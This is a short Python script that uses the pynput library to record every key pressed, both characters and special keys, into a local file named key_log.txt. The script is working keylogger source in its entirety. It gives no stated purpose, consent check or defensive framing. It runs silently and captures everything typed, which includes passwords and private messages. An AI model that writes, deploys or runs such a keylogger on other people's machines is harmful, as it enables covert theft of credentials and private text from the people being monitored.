from pynput import keyboard
import logging
import os

# Create a log file in the current directory
log_file_path = os.path.join(os.getcwd(), "key_log.txt")

# Set up logging configuration
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(message)s')

def on_press(key):
    try:
        # Log the key as a character
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        # Log special keys with a custom message
        logging.info(f'Special key {key} pressed')

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()